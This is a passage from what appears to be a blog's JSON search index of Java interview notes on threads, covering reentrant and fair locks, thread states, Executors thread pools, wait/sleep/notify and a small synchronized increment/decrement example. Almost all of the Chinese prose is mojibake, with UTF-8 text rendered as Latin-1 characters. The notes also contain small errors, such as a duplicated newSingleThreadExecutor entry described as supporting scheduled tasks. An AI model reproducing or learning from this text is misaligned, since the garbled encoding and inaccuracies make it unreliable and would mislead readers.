æ¯ä¸ªé”å…³è”ä¸€ä¸ªçº¿ç¨‹æŒæœ‰è€…å’Œä¸€ä¸ªè®¡æ•°å™¨ã€‚å½“è®¡æ•°å™¨ä¸º0æ—¶è¡¨ç¤ºè¯¥é”æ²¡æœ‰è¢«ä»»ä½•çº¿ç¨‹æŒæœ‰ï¼Œé‚£ä¹ˆä»»ä½•çº¿ç¨‹éƒ½éƒ½å¯èƒ½è·å¾—è¯¥é”è€Œè°ƒç”¨ç›¸åº”æ–¹æ³•ã€‚å½“ä¸€ä¸ªçº¿ç¨‹è¯·æ±‚æˆåŠŸåï¼ŒJVMä¼šè®°ä¸‹æŒæœ‰é”çš„çº¿ç¨‹ï¼Œå¹¶å°†è®¡æ•°å™¨è®¡ä¸º1ã€‚æ­¤æ—¶å…¶ä»–çº¿ç¨‹è¯·æ±‚è¯¥é”ï¼Œåˆ™å¿…é¡»ç­‰å¾…ã€‚è€Œè¯¥æŒæœ‰é”çš„çº¿ç¨‹å¦‚æœå†æ¬¡è¯·æ±‚è¿™ä¸ªé”ï¼Œå°±å¯ä»¥å†æ¬¡æ‹¿åˆ°è¿™ä¸ªé”ï¼ŒåŒæ—¶è®¡æ•°å™¨ä¼šé€’å¢ã€‚å½“çº¿ç¨‹é€€å‡ºä¸€ä¸ªsynchronizedæ–¹æ³•/å—æ—¶ï¼Œè®¡æ•°å™¨ä¼šé€’å‡ï¼Œå¦‚æœè®¡æ•°å™¨ä¸º0åˆ™é‡Šæ”¾è¯¥é”ã€‚ è¯·è®²ä¸€ä¸‹éå…¬å¹³é”å’Œå…¬å¹³é”åœ¨reetrantlocké‡Œçš„å®ç°è¿‡ç¨‹æ˜¯æ€æ ·çš„ã€‚ å¦‚æœä¸€ä¸ªé”æ˜¯å…¬å¹³çš„ï¼Œé‚£ä¹ˆé”çš„è·å–é¡ºåºå°±åº”è¯¥ç¬¦åˆè¯·æ±‚çš„ç»å¯¹æ—¶é—´é¡ºåºï¼ŒFIFOã€‚å¯¹äºéå…¬å¹³é”ï¼Œåªè¦CASè®¾ç½®åŒæ­¥çŠ¶æ€æˆåŠŸï¼Œåˆ™è¡¨ç¤ºå½“å‰çº¿ç¨‹è·å–äº†é”ï¼Œè€Œå…¬å¹³é”è¿˜éœ€è¦åˆ¤æ–­å½“å‰èŠ‚ç‚¹æ˜¯å¦æœ‰å‰é©±èŠ‚ç‚¹ï¼Œå¦‚æœæœ‰ï¼Œåˆ™è¡¨ç¤ºæœ‰çº¿ç¨‹æ¯”å½“å‰çº¿ç¨‹æ›´æ—©è¯·æ±‚è·å–é”ï¼Œå› æ­¤éœ€è¦ç­‰å¾…å‰é©±çº¿ç¨‹è·å–å¹¶é‡Šæ”¾é”ä¹‹åæ‰èƒ½ç»§ç»­è·å–é”ã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"Thread","slug":"Thread","date":"2020-07-13T21:30:23.000Z","updated":"2021-04-11T17:11:28.466Z","comments":true,"path":"Thread/","link":"","permalink":"https://blog.kayleh.top/Thread/","excerpt":"THREAD","text":"THREAD å¦‚ä½•ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Ÿé€šè¿‡åˆç†çš„æ—¶é—´è°ƒåº¦ï¼Œé¿å¼€å…±äº«èµ„æºçš„å­˜å–å†²çªã€‚å¦å¤–ï¼Œåœ¨å¹¶è¡Œä»»åŠ¡è®¾è®¡ä¸Šå¯ä»¥é€šè¿‡é€‚å½“çš„ç­–ç•¥ï¼Œä¿è¯ä»»åŠ¡ä¸ä»»åŠ¡ä¹‹é—´ä¸å­˜åœ¨å…±äº«èµ„æºï¼Œè®¾è®¡ä¸€ä¸ªè§„åˆ™æ¥ä¿è¯ä¸€ä¸ªå®¢æˆ·çš„è®¡ç®—å·¥ä½œå’Œæ•°æ®è®¿é—®åªä¼šè¢«ä¸€ä¸ªçº¿ç¨‹æˆ–ä¸€å°å·¥ä½œæœºå®Œæˆï¼Œè€Œä¸æ˜¯æŠŠä¸€ä¸ªå®¢æˆ·çš„è®¡ç®—å·¥ä½œåˆ†é…ç»™å¤šä¸ªçº¿ç¨‹å»å®Œæˆã€‚ ç®€è¦è¯´æ˜ä¸€ä¸‹çº¿ç¨‹çš„åŸºæœ¬çŠ¶æ€ä»¥åŠçŠ¶æ€ä¹‹é—´çš„å…³ç³»ï¼Ÿå…¶ä¸­Runningè¡¨ç¤ºè¿è¡ŒçŠ¶æ€ï¼ŒRunnableè¡¨ç¤ºå°±ç»ªçŠ¶æ€ï¼ˆä¸‡äº‹ä¿±å¤‡ï¼Œåªæ¬ CPUï¼‰ï¼ŒBlockedè¡¨ç¤ºé˜»å¡çŠ¶æ€ï¼Œé˜»å¡çŠ¶æ€åˆæœ‰å¤šç§æƒ…å†µï¼Œå¯èƒ½æ˜¯å› ä¸ºè°ƒç”¨wait()æ–¹æ³•è¿›å…¥ç­‰å¾…æ± ï¼Œä¹Ÿå¯èƒ½æ˜¯æ‰§è¡ŒåŒæ­¥æ–¹æ³•æˆ–åŒæ­¥ä»£ç å—è¿›å…¥ç­‰é”æ± ï¼Œæˆ–è€…æ˜¯è°ƒç”¨äº†sleep()æ–¹æ³•æˆ–join()æ–¹æ³•ç­‰å¾…ä¼‘çœ æˆ–å…¶ä»–çº¿ç¨‹ç»“æŸï¼Œæˆ–æ˜¯å› ä¸ºå‘ç”Ÿäº†I/Oä¸­æ–­ã€‚ è§£é‡Šä¸€ä¸‹ä»€ä¹ˆæ˜¯çº¿ç¨‹æ± ï¼ˆthread poolï¼‰ï¼Ÿåœ¨é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­ï¼Œåˆ›å»ºå’Œé”€æ¯å¯¹è±¡æ˜¯å¾ˆè´¹æ—¶é—´çš„ï¼Œå› ä¸ºåˆ›å»ºä¸€ä¸ªå¯¹è±¡è¦è·å–å†…å­˜èµ„æºæˆ–è€…å…¶å®ƒæ›´å¤šèµ„æºã€‚åœ¨Javaä¸­æ›´æ˜¯å¦‚æ­¤ï¼Œè™šæ‹Ÿæœºå°†è¯•å›¾è·Ÿè¸ªæ¯ä¸€ä¸ªå¯¹è±¡ï¼Œä»¥ä¾¿èƒ½å¤Ÿåœ¨å¯¹è±¡é”€æ¯åè¿›è¡Œåƒåœ¾å›æ”¶ã€‚æ‰€ä»¥æé«˜æœåŠ¡ç¨‹åºæ•ˆç‡çš„ä¸€ä¸ªæ‰‹æ®µå°±æ˜¯å°½å¯èƒ½å‡å°‘åˆ›å»ºå’Œé”€æ¯å¯¹è±¡çš„æ¬¡æ•°ï¼Œç‰¹åˆ«æ˜¯ä¸€äº›å¾ˆè€—èµ„æºçš„å¯¹è±¡åˆ›å»ºå’Œé”€æ¯ï¼Œè¿™å°±æ˜¯â€æ± åŒ–èµ„æºâ€æŠ€æœ¯äº§ç”Ÿçš„åŸå› ã€‚çº¿ç¨‹æ± é¡¾åæ€ä¹‰å°±æ˜¯äº‹å…ˆåˆ›å»ºè‹¥å¹²ä¸ªå¯æ‰§è¡Œçš„çº¿ç¨‹æ”¾å…¥ä¸€ä¸ªæ± ï¼ˆå®¹å™¨ï¼‰ä¸­ï¼Œéœ€è¦çš„æ—¶å€™ä»æ± ä¸­è·å–çº¿ç¨‹ä¸ç”¨è‡ªè¡Œåˆ›å»ºï¼Œä½¿ç”¨å®Œæ¯•ä¸éœ€è¦é”€æ¯çº¿ç¨‹è€Œæ˜¯æ”¾å›æ± ä¸­ï¼Œä»è€Œå‡å°‘åˆ›å»ºå’Œé”€æ¯çº¿ç¨‹å¯¹è±¡çš„å¼€é”€ã€‚Java 5+ä¸­çš„Executoræ¥å£å®šä¹‰ä¸€ä¸ªæ‰§è¡Œçº¿ç¨‹çš„å·¥å…·ã€‚å®ƒçš„å­ç±»å‹å³çº¿ç¨‹æ± æ¥å£æ˜¯ExecutorServiceã€‚è¦é…ç½®ä¸€ä¸ªçº¿ç¨‹æ± æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œå°¤å…¶æ˜¯å¯¹äºçº¿ç¨‹æ± çš„åŸç†ä¸æ˜¯å¾ˆæ¸…æ¥šçš„æƒ…å†µä¸‹ï¼Œå› æ­¤åœ¨å·¥å…·ç±»Executorsé¢æä¾›äº†ä¸€äº›é™æ€å·¥å‚æ–¹æ³•ï¼Œç”Ÿæˆä¸€äº›å¸¸ç”¨çš„çº¿ç¨‹æ± ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š- newSingleThreadExecutorï¼šåˆ›å»ºä¸€ä¸ªå•çº¿ç¨‹çš„çº¿ç¨‹æ± ã€‚è¿™ä¸ªçº¿ç¨‹æ± åªæœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨å·¥ä½œï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºå•çº¿ç¨‹ä¸²è¡Œæ‰§è¡Œæ‰€æœ‰ä»»åŠ¡ã€‚å¦‚æœè¿™ä¸ªå”¯ä¸€çš„çº¿ç¨‹å› ä¸ºå¼‚å¸¸ç»“æŸï¼Œé‚£ä¹ˆä¼šæœ‰ä¸€ä¸ªæ–°çš„çº¿ç¨‹æ¥æ›¿ä»£å®ƒã€‚æ­¤çº¿ç¨‹æ± ä¿è¯æ‰€æœ‰ä»»åŠ¡çš„æ‰§è¡Œé¡ºåºæŒ‰ç…§ä»»åŠ¡çš„æäº¤é¡ºåºæ‰§è¡Œã€‚- newFixedThreadPoolï¼šåˆ›å»ºå›ºå®šå¤§å°çš„çº¿ç¨‹æ± ã€‚æ¯æ¬¡æäº¤ä¸€ä¸ªä»»åŠ¡å°±åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œç›´åˆ°çº¿ç¨‹è¾¾åˆ°çº¿ç¨‹æ± çš„æœ€å¤§å¤§å°ã€‚çº¿ç¨‹æ± çš„å¤§å°ä¸€æ—¦è¾¾åˆ°æœ€å¤§å€¼å°±ä¼šä¿æŒä¸å˜ï¼Œå¦‚æœæŸä¸ªçº¿ç¨‹å› ä¸ºæ‰§è¡Œå¼‚å¸¸è€Œç»“æŸï¼Œé‚£ä¹ˆçº¿ç¨‹æ± ä¼šè¡¥å……ä¸€ä¸ªæ–°çº¿ç¨‹ã€‚- newCachedThreadPoolï¼šåˆ›å»ºä¸€ä¸ªå¯ç¼“å­˜çš„çº¿ç¨‹æ± ã€‚å¦‚æœçº¿ç¨‹æ± çš„å¤§å°è¶…è¿‡äº†å¤„ç†ä»»åŠ¡æ‰€éœ€è¦çš„çº¿ç¨‹ï¼Œé‚£ä¹ˆå°±ä¼šå›æ”¶éƒ¨åˆ†ç©ºé—²ï¼ˆ60ç§’ä¸æ‰§è¡Œä»»åŠ¡ï¼‰çš„çº¿ç¨‹ï¼Œå½“ä»»åŠ¡æ•°å¢åŠ æ—¶ï¼Œæ­¤çº¿ç¨‹æ± åˆå¯ä»¥æ™ºèƒ½çš„æ·»åŠ æ–°çº¿ç¨‹æ¥å¤„ç†ä»»åŠ¡ã€‚æ­¤çº¿ç¨‹æ± ä¸ä¼šå¯¹çº¿ç¨‹æ± å¤§å°åšé™åˆ¶ï¼Œçº¿ç¨‹æ± å¤§å°å®Œå…¨ä¾èµ–äºæ“ä½œç³»ç»Ÿï¼ˆæˆ–è€…è¯´JVMï¼‰èƒ½å¤Ÿåˆ›å»ºçš„æœ€å¤§çº¿ç¨‹å¤§å°ã€‚- newScheduledThreadPoolï¼šåˆ›å»ºä¸€ä¸ªå¤§å°æ— é™çš„çº¿ç¨‹æ± ã€‚æ­¤çº¿ç¨‹æ± æ”¯æŒå®šæ—¶ä»¥åŠå‘¨æœŸæ€§æ‰§è¡Œä»»åŠ¡çš„éœ€æ±‚ã€‚- newSingleThreadExecutorï¼šåˆ›å»ºä¸€ä¸ªå•çº¿ç¨‹çš„çº¿ç¨‹æ± ã€‚æ­¤çº¿ç¨‹æ± æ”¯æŒå®šæ—¶ä»¥åŠå‘¨æœŸæ€§æ‰§è¡Œä»»åŠ¡çš„éœ€æ±‚ã€‚ ä¸¾ä¾‹è¯´æ˜åŒæ­¥å’Œå¼‚æ­¥å¦‚æœç³»ç»Ÿä¸­å­˜åœ¨ä¸´ç•Œèµ„æºï¼ˆèµ„æºæ•°é‡å°‘äºç«äº‰èµ„æºçš„çº¿ç¨‹æ•°é‡çš„èµ„æºï¼‰ï¼Œä¾‹å¦‚æ­£åœ¨å†™çš„æ•°æ®ä»¥åå¯èƒ½è¢«å¦ä¸€ä¸ªçº¿ç¨‹è¯»åˆ°ï¼Œæˆ–è€…æ­£åœ¨è¯»çš„æ•°æ®å¯èƒ½å·²ç»è¢«å¦ä¸€ä¸ªçº¿ç¨‹å†™è¿‡äº†ï¼Œé‚£ä¹ˆè¿™äº›æ•°æ®å°±å¿…é¡»è¿›è¡ŒåŒæ­¥å­˜å–ï¼ˆæ•°æ®åº“æ“ä½œä¸­çš„æ’ä»–é”å°±æ˜¯æœ€å¥½çš„ä¾‹å­ï¼‰ã€‚å½“åº”ç”¨ç¨‹åºåœ¨å¯¹è±¡ä¸Šè°ƒç”¨äº†ä¸€ä¸ªéœ€è¦èŠ±è´¹å¾ˆé•¿æ—¶é—´æ¥æ‰§è¡Œçš„æ–¹æ³•ï¼Œå¹¶ä¸”ä¸å¸Œæœ›è®©ç¨‹åºç­‰å¾…æ–¹æ³•çš„è¿”å›æ—¶ï¼Œå°±åº”è¯¥ä½¿ç”¨å¼‚æ­¥ç¼–ç¨‹ï¼Œåœ¨å¾ˆå¤šæƒ…å†µä¸‹é‡‡ç”¨å¼‚æ­¥é€”å¾„å¾€å¾€æ›´æœ‰æ•ˆç‡ã€‚äº‹å®ä¸Šï¼Œæ‰€è°“çš„åŒæ­¥å°±æ˜¯æŒ‡é˜»å¡å¼æ“ä½œï¼Œè€Œå¼‚æ­¥å°±æ˜¯éé˜»å¡å¼æ“ä½œã€‚ ä»‹ç»ä¸€ä¸‹çº¿ç¨‹åŒæ­¥å’Œçº¿ç¨‹è°ƒåº¦çš„ç›¸å…³æ–¹æ³•ã€‚ - wait()ï¼šä½¿ä¸€ä¸ªçº¿ç¨‹å¤„äºç­‰å¾…ï¼ˆé˜»å¡ï¼‰çŠ¶æ€ï¼Œå¹¶ä¸”é‡Šæ”¾æ‰€æŒæœ‰çš„å¯¹è±¡çš„é”ï¼›- sleep()ï¼šä½¿ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„çº¿ç¨‹å¤„äºç¡çœ çŠ¶æ€ï¼Œæ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œè°ƒç”¨æ­¤æ–¹æ³•è¦å¤„ç†InterruptedExceptionå¼‚å¸¸ï¼›- notify()ï¼šå”¤é†’ä¸€ä¸ªå¤„äºç­‰å¾…çŠ¶æ€çš„çº¿ç¨‹ï¼Œå½“ç„¶åœ¨è°ƒç”¨æ­¤æ–¹æ³•çš„æ—¶å€™ï¼Œå¹¶ä¸èƒ½ç¡®åˆ‡çš„å”¤é†’æŸä¸€ä¸ªç­‰å¾…çŠ¶æ€çš„çº¿ç¨‹ï¼Œè€Œæ˜¯ç”±JVMç¡®å®šå”¤é†’å“ªä¸ªçº¿ç¨‹ï¼Œè€Œä¸”ä¸ä¼˜å…ˆçº§æ— å…³ï¼›- notityAll()ï¼šå”¤é†’æ‰€æœ‰å¤„äºç­‰å¾…çŠ¶æ€çš„çº¿ç¨‹ï¼Œè¯¥æ–¹æ³•å¹¶ä¸æ˜¯å°†å¯¹è±¡çš„é”ç»™æ‰€æœ‰çº¿ç¨‹ï¼Œè€Œæ˜¯è®©å®ƒä»¬ç«äº‰ï¼Œåªæœ‰è·å¾—é”çš„çº¿ç¨‹æ‰èƒ½è¿›å…¥å°±ç»ªçŠ¶æ€ï¼›é€šè¿‡Lockæ¥å£æä¾›äº†æ˜¾å¼çš„é”æœºåˆ¶ï¼ˆexplicit lockï¼‰ï¼Œå¢å¼ºäº†çµæ´»æ€§ä»¥åŠå¯¹çº¿ç¨‹çš„åè°ƒã€‚Lockæ¥å£ä¸­å®šä¹‰äº†åŠ é”ï¼ˆlock()ï¼‰å’Œè§£é”ï¼ˆunlock()ï¼‰çš„æ–¹æ³•ï¼ŒåŒæ—¶è¿˜æä¾›äº†newCondition()æ–¹æ³•æ¥äº§ç”Ÿç”¨äºçº¿ç¨‹ä¹‹é—´é€šä¿¡çš„Conditionå¯¹è±¡ï¼›æ­¤å¤–ï¼ŒJava 5è¿˜æä¾›äº†ä¿¡å·é‡æœºåˆ¶ï¼ˆsemaphoreï¼‰ï¼Œä¿¡å·é‡å¯ä»¥ç”¨æ¥é™åˆ¶å¯¹æŸä¸ªå…±äº«èµ„æºè¿›è¡Œè®¿é—®çš„çº¿ç¨‹çš„æ•°é‡ã€‚åœ¨å¯¹èµ„æºè¿›è¡Œè®¿é—®ä¹‹å‰ï¼Œçº¿ç¨‹å¿…é¡»å¾—åˆ°ä¿¡å·é‡çš„è®¸å¯ï¼ˆè°ƒç”¨Semaphoreå¯¹è±¡çš„acquire()æ–¹æ³•ï¼‰ï¼›åœ¨å®Œæˆå¯¹èµ„æºçš„è®¿é—®åï¼Œçº¿ç¨‹å¿…é¡»å‘ä¿¡å·é‡å½’è¿˜è®¸å¯ï¼ˆè°ƒç”¨Semaphoreå¯¹è±¡çš„release()æ–¹æ³•ï¼‰ã€‚ è¯·é—®å½“ä¸€ä¸ªçº¿ç¨‹è¿›å…¥ä¸€ä¸ªå¯¹è±¡çš„synchronizedæ–¹æ³•Aä¹‹åï¼Œå…¶å®ƒçº¿ç¨‹æ˜¯å¦å¯è¿›å…¥æ­¤å¯¹è±¡çš„synchronizedæ–¹æ³•Bï¼Ÿä¸èƒ½ã€‚å…¶å®ƒçº¿ç¨‹åªèƒ½è®¿é—®è¯¥å¯¹è±¡çš„éåŒæ­¥æ–¹æ³•ï¼ŒåŒæ­¥æ–¹æ³•åˆ™ä¸èƒ½è¿›å…¥ã€‚å› ä¸ºéé™æ€æ–¹æ³•ä¸Šçš„synchronizedä¿®é¥°ç¬¦è¦æ±‚æ‰§è¡Œæ–¹æ³•æ—¶è¦è·å¾—å¯¹è±¡çš„é”ï¼Œå¦‚æœå·²ç»è¿›å…¥Aæ–¹æ³•è¯´æ˜å¯¹è±¡é”å·²ç»è¢«å–èµ°ï¼Œé‚£ä¹ˆè¯•å›¾è¿›å…¥Bæ–¹æ³•çš„çº¿ç¨‹å°±åªèƒ½åœ¨ç­‰é”æ± ï¼ˆæ³¨æ„ä¸æ˜¯ç­‰å¾…æ± å“¦ï¼‰ä¸­ç­‰å¾…å¯¹è±¡çš„é”ã€‚ è¯·ç®€è¿°ä¸€ä¸‹çº¿ç¨‹çš„sleep()æ–¹æ³•å’Œyield()æ–¹æ³•æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿâ‘ sleep()æ–¹æ³•ç»™å…¶ä»–çº¿ç¨‹è¿è¡Œæœºä¼šæ—¶ä¸è€ƒè™‘çº¿ç¨‹çš„ä¼˜å…ˆçº§ï¼Œå› æ­¤ä¼šç»™ä½ä¼˜å…ˆçº§çš„çº¿ç¨‹ä»¥è¿è¡Œçš„æœºä¼šï¼› yield()æ–¹æ³•åªä¼šç»™ç›¸åŒä¼˜å…ˆçº§æˆ–æ›´é«˜ä¼˜å…ˆçº§çš„çº¿ç¨‹ä»¥è¿è¡Œçš„æœºä¼šï¼› â‘¡ çº¿ç¨‹æ‰§è¡Œsleep()æ–¹æ³•åè½¬å…¥é˜»å¡ï¼ˆblockedï¼‰çŠ¶æ€ï¼Œ è€Œæ‰§è¡Œyield()æ–¹æ³•åè½¬å…¥å°±ç»ªï¼ˆreadyï¼‰çŠ¶æ€ï¼› Javaä¸­æœ‰å‡ ç§æ–¹æ³•å¯ä»¥å®ç°ä¸€ä¸ªçº¿ç¨‹ï¼Ÿç”¨ä»€ä¹ˆå…³é”®å­—ä¿®é¥°åŒæ­¥æ–¹æ³•? stop()å’Œsuspend()æ–¹æ³•ä¸ºä½•ä¸æ¨èä½¿ç”¨ï¼Œè¯·è¯´æ˜åŸå› ï¼Ÿæœ‰ä¸¤ç§å®ç°æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯ç»§æ‰¿Threadç±»ä¸å®ç°Runnableæ¥å£ï¼Œç”¨synchronizedå…³é”®å­—ä¿®é¥°åŒæ­¥æ–¹æ³•ï¼Œ åå¯¹ä½¿ç”¨stop()ï¼Œæ˜¯å› ä¸ºå®ƒä¸å®‰å…¨ã€‚å®ƒä¼šè§£é™¤ç”±çº¿ç¨‹è·å–çš„æ‰€æœ‰é”å®šï¼Œè€Œä¸”å¦‚æœå¯¹è±¡å¤„äºä¸€ç§ä¸è¿è´¯çŠ¶æ€ï¼Œé‚£ä¹ˆå…¶ä»–çº¿ç¨‹èƒ½åœ¨é‚£ç§çŠ¶æ€ä¸‹æ£€æŸ¥å’Œä¿®æ”¹å®ƒä»¬ã€‚ç»“æœå¾ˆéš¾æ£€æŸ¥å‡ºçœŸæ­£çš„é—®é¢˜æ‰€åœ¨ã€‚suspend()æ–¹æ³•å®¹æ˜“å‘ç”Ÿæ­»é”ã€‚ è°ƒç”¨suspend()çš„æ—¶å€™ï¼Œç›®æ ‡çº¿ç¨‹ä¼šåœä¸‹æ¥ï¼Œä½†å´ä»ç„¶æŒæœ‰åœ¨è¿™ä¹‹å‰è·å¾—çš„é”å®šã€‚æ­¤æ—¶ï¼Œå…¶ä»–ä»»ä½•çº¿ç¨‹éƒ½ä¸èƒ½è®¿é—®é”å®šçš„èµ„æºï¼Œé™¤éè¢«â€æŒ‚èµ·â€çš„çº¿ç¨‹æ¢å¤è¿è¡Œã€‚å¯¹ä»»ä½•çº¿ç¨‹æ¥è¯´ï¼Œå¦‚æœå®ƒä»¬æƒ³æ¢å¤ç›®æ ‡çº¿ç¨‹ï¼ŒåŒæ—¶åˆè¯•å›¾ä½¿ç”¨ä»»ä½•ä¸€ä¸ªé”å®šçš„èµ„æºï¼Œå°±ä¼šé€ æˆæ­»é”ã€‚æ‰€ä»¥ä¸åº”è¯¥ä½¿ç”¨suspend()ï¼Œè€Œåº”åœ¨è‡ªå·±çš„Threadç±»ä¸­ç½®å…¥ä¸€ä¸ªæ ‡å¿—ï¼ŒæŒ‡å‡ºçº¿ç¨‹åº”è¯¥æ´»åŠ¨è¿˜æ˜¯æŒ‚èµ·ã€‚è‹¥æ ‡å¿—æŒ‡å‡ºçº¿ç¨‹åº”è¯¥æŒ‚èµ·ï¼Œä¾¿ç”¨ wait()å‘½å…¶è¿›å…¥ç­‰å¾…çŠ¶æ€ã€‚è‹¥æ ‡å¿—æŒ‡å‡ºçº¿ç¨‹åº”å½“æ¢å¤ï¼Œåˆ™ç”¨ä¸€ä¸ªnotify()é‡æ–°å¯åŠ¨çº¿ç¨‹ã€‚ å¤šçº¿ç¨‹å’ŒåŒæ­¥æœ‰å‡ ç§å®ç°æ–¹æ³•,å¹¶ä¸”è¿™äº›å®ç°æ–¹æ³•å…·ä½“å†…å®¹éƒ½æ˜¯ä»€ä¹ˆ?å¤šçº¿ç¨‹æœ‰ä¸¤ç§å®ç°æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯ç»§æ‰¿Threadç±»ä¸å®ç°Runnableæ¥å£åŒæ­¥çš„å®ç°æ–¹é¢æœ‰ä¸¤ç§ï¼Œåˆ†åˆ«æ˜¯synchronized,waitä¸notifyã€‚ è¯´å‡ºä½ æ‰€çŸ¥é“çš„çº¿ç¨‹åŒæ­¥çš„æ–¹æ³•wait():ä½¿ä¸€ä¸ªçº¿ç¨‹å¤„äºç­‰å¾…çŠ¶æ€ï¼Œå¹¶ä¸”é‡Šæ”¾æ‰€æŒæœ‰çš„å¯¹è±¡çš„lockã€‚sleep():ä½¿ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„çº¿ç¨‹å¤„äºç¡çœ çŠ¶æ€ï¼Œæ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œè°ƒç”¨æ­¤æ–¹æ³•è¦æ•æ‰InterruptedExceptionå¼‚å¸¸ã€‚notify():å”¤é†’ä¸€ä¸ªå¤„äºç­‰å¾…çŠ¶æ€çš„çº¿ç¨‹ï¼Œæ³¨æ„çš„æ˜¯åœ¨è°ƒç”¨æ­¤æ–¹æ³•çš„æ—¶å€™ï¼Œå¹¶ä¸èƒ½ç¡®åˆ‡çš„å”¤é†’æŸä¸€ä¸ªç­‰å¾…çŠ¶æ€çš„çº¿ç¨‹ï¼Œè€Œæ˜¯ç”±JVMç¡®å®šå”¤é†’å“ªä¸ªçº¿ç¨‹ï¼Œè€Œä¸”ä¸æ˜¯æŒ‰ä¼˜å…ˆçº§ã€‚Allnotity():å”¤é†’æ‰€æœ‰å¤„å…¥ç­‰å¾…çŠ¶æ€çš„çº¿ç¨‹ï¼Œæ³¨æ„å¹¶ä¸æ˜¯ç»™æ‰€æœ‰å”¤é†’çº¿ç¨‹ä¸€ä¸ªå¯¹è±¡çš„é”ï¼Œè€Œæ˜¯è®©å®ƒä»¬ç«äº‰ã€‚ å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹æ˜¯ç”¨run()è¿˜æ˜¯start()?å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹æ˜¯è°ƒç”¨start()æ–¹æ³•ï¼Œä½¿çº¿ç¨‹æ‰€ä»£è¡¨çš„è™šæ‹Ÿå¤„ç†æœºå¤„äºå¯è¿è¡ŒçŠ¶æ€ï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥ç”±JVMè°ƒåº¦å¹¶æ‰§è¡Œã€‚è¿™å¹¶ä¸æ„å‘³ç€çº¿ç¨‹å°±ä¼šç«‹å³è¿è¡Œã€‚run()æ–¹æ³•å¯ä»¥äº§ç”Ÿå¿…é¡»é€€å‡ºçš„æ ‡å¿—æ¥åœæ­¢ä¸€ä¸ªçº¿ç¨‹ã€‚ è¯·ä½¿ç”¨å†…éƒ¨ç±»å®ç°çº¿ç¨‹è®¾è®¡4ä¸ªçº¿ç¨‹ï¼Œå…¶ä¸­ä¸¤ä¸ªçº¿ç¨‹æ¯æ¬¡å¯¹jå¢åŠ 1ï¼Œå¦å¤–ä¸¤ä¸ªçº¿ç¨‹å¯¹jæ¯æ¬¡å‡å°‘1ã€‚public class ThreadTest1{ private int j; public static void main(String args[]){ ThreadTest1 tt=new ThreadTest1(); Inc inc=tt.new Inc(); Dec dec=tt.new Dec(); for(int i=0;i&lt;2;i++){ Thread t=new Thread(inc); t.start(); t=new Thread(dec); t.start(); } } private synchronized void inc(){ j++; System.out.println(Thread.currentThread().getName()+&quot;-inc:&quot;+j); } private synchronized void dec(){ j--; System.out.println(Thread.currentThread().getName()+&quot;-dec:&quot;+j); } class Inc implements Runnable{ public void run(){ for(int i=0;i&lt;100;i++){ inc(); } } } class Dec implements Runnable{ public void run(){ for(int i=0;i&lt;100;i++){ dec(); } } } } è¯´æ˜ä¸€ä¸‹çº¿ç¨‹ä¸­çš„åŒæ­¥å’Œå¼‚æ­¥æœ‰ä½•å¼‚åŒï¼Ÿå¹¶ä¸”è¯·ä¸¾ä¾‹è¯´æ˜åœ¨ä»€ä¹ˆæƒ…å†µä¸‹ä¼šä½¿ç”¨åˆ°åŒæ­¥å’Œå¼‚æ­¥ï¼Ÿå¦‚æœæ•°æ®å°†åœ¨çº¿ç¨‹é—´å…±äº«ã€‚ä¾‹å¦‚æ­£åœ¨å†™çš„æ•°æ®ä»¥åå¯èƒ½è¢«å¦ä¸€ä¸ªçº¿ç¨‹è¯»åˆ°ï¼Œæˆ–è€…æ­£åœ¨è¯»çš„æ•°æ®å¯èƒ½å·²ç»è¢«å¦ä¸€ä¸ªçº¿ç¨‹å†™è¿‡äº†ï¼Œé‚£ä¹ˆè¿™äº›æ•°æ®å°±æ˜¯å…±äº«æ•°æ®ï¼Œå¿…é¡»è¿›è¡ŒåŒæ­¥å­˜å–ã€‚å½“åº”ç”¨ç¨‹åºåœ¨å¯¹è±¡ä¸Šè°ƒç”¨äº†ä¸€ä¸ªéœ€è¦èŠ±è´¹å¾ˆé•¿æ—¶é—´æ¥æ‰§è¡Œçš„æ–¹æ³•ï¼Œå¹¶ä¸”ä¸å¸Œæœ›è®©ç¨‹åºç­‰å¾…æ–¹æ³•çš„è¿”å›æ—¶ï¼Œå°±åº”è¯¥ä½¿ç”¨å¼‚æ­¥ç¼–ç¨‹ï¼Œåœ¨å¾ˆå¤šæƒ…å†µä¸‹é‡‡ç”¨å¼‚æ­¥é€”å¾„å¾€å¾€æ›´æœ‰æ•ˆç‡ã€‚ æ˜ä¸€ä¸‹sleep() å’Œ wait() æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿsleepæ˜¯çº¿ç¨‹ç±»ï¼ˆThreadï¼‰çš„æ–¹æ³•ï¼Œå¯¼è‡´æ­¤çº¿ç¨‹æš‚åœæ‰§è¡ŒæŒ‡å®šæ—¶é—´ï¼ŒæŠŠæ‰§è¡Œæœºä¼šç»™å…¶ä»–çº¿ç¨‹ï¼Œä½†æ˜¯ç›‘æ§çŠ¶æ€ä¾ç„¶ä¿æŒï¼Œåˆ°æ—¶åä¼šè‡ªåŠ¨æ¢å¤ã€‚è°ƒç”¨sleepä¸ä¼šé‡Šæ”¾å¯¹è±¡é”ã€‚waitæ˜¯Objectç±»çš„æ–¹æ³•ï¼Œå¯¹æ­¤å¯¹è±¡è°ƒç”¨waitæ–¹æ³•å¯¼è‡´æœ¬çº¿ç¨‹æ”¾å¼ƒå¯¹è±¡é”ï¼Œè¿›å…¥ç­‰å¾…æ­¤å¯¹è±¡çš„ç­‰å¾…é”å®šæ± 